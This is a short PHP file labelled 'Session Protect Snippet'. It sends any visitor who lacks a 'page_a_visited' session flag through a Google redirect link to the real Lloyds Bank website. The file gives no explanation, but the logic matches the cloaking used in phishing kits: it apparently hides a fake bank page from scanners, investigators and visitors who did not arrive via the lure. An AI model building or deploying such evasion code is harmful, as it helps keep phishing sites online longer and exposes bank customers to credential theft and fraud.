<?php

# Session Protect Snippet

session_start();
if(!isset($_SESSION['page_a_visited'])){
        header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwjl85mT1sXKAhUEgYMKHTuRDPcQFgggMAA&url=https%3A%2F%2Fwww.lloydsbank.com%2F&usg=AFQjCNHwnOsaDFecNsQiIcucp1tSwmqtWg&sig2=qKpLAIIoypujYJ9reKFD3g");
		die();

}
?>